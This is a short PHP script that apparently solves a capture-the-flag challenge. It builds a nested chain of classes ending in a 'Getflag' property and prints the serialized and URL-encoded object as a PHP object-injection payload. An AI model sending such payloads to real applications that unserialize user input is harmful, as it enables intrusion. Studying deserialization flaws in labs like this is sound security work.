<?php 
//3<---1<---2<---4
class rank3{
    private $admin = 'aaa';
    protected $passwd = '123456';
	public function __construct(){
		$this->admin ='r3a';
		$this->passwd = 'r3b';
	}

}

class rank1{
	public $r1a;
    public $r1b;
	public function __construct(){
        $this->r1a=new rank3();
        $this->r1b='Getflag';
    }

}

class rank2{
	public $r2a;
	public function __construct(){
		$this->r2a = new rank1();
	}
}
class rank4{
	public $r4a;
	public function __construct(){
        $this->r4a=new rank2();
    }
}

//3<---1<---2<---4
$a=new rank4();
echo serialize( $a )."\n";
echo urlencode(serialize($a));